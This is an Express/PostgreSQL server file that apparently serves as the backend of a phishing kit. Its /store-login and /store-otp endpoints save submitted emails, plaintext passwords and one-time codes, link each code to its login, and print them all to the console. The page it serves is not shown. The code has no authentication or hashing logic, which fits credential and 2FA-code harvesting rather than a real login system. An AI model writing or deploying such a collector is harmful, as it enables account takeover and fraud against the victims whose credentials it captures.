require("dotenv").config();
const express = require("express");
const cors = require("cors");
const { Pool } = require("pg");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Logger
app.use((req, res, next) => {
  console.log(new Date().toISOString(), req.method, req.url);
  next();
});

// PostgreSQL pool
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false },
});

// Create tables
const createTables = async () => {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS logins (
        id SERIAL PRIMARY KEY,
        email TEXT NOT NULL,
        pass TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS otps (
        id SERIAL PRIMARY KEY,
        login_id INTEGER REFERENCES logins(id) ON DELETE CASCADE,
        email TEXT NOT NULL,
        otp TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);

    console.log("Tables are ready ✅");
  } catch (err) {
    console.error("Error creating tables:", err);
    process.exit(1);
  }
};

// Routes
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post("/store-login", async (req, res) => {
  const { email, pass } = req.body;
  if (!email || !pass) return res.status(400).json({ error: "Missing fields" });

  try {
    const result = await pool.query(
      "INSERT INTO logins (email, pass) VALUES ($1, $2) RETURNING *",
      [email, pass]
    );
    console.log("Saved login:", result.rows[0]);
    res.json({ success: true, id: result.rows[0].id });
  } catch (err) {
    console.error("DB error:", err);
    res.status(500).json({ error: "Database error" });
  }
});

app.post("/store-otp", async (req, res) => {
  const { email, otp } = req.body;
  if (!email || !otp) return res.status(400).json({ error: "Missing fields" });

  try {
    const loginRes = await pool.query(
      "SELECT id FROM logins WHERE email = $1 ORDER BY created_at DESC LIMIT 1",
      [email]
    );

    if (loginRes.rowCount === 0) {
      return res.status(400).json({ success: false, error: "No login found for this email" });
    }

    const loginId = loginRes.rows[0].id;

    const result = await pool.query(
      "INSERT INTO otps (login_id, email, otp) VALUES ($1, $2, $3) RETURNING *",
      [loginId, email, otp]
    );

    console.log("Saved OTP linked to login id:", result.rows[0]);
    res.json({ success: true, loginId });
  } catch (err) {
    console.error("DB error:", err);
    res.status(500).json({ success: false, error: err.message });
  }
});

// Start server
const startServer = async () => {
  await createTables();
  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
  });
};

startServer();
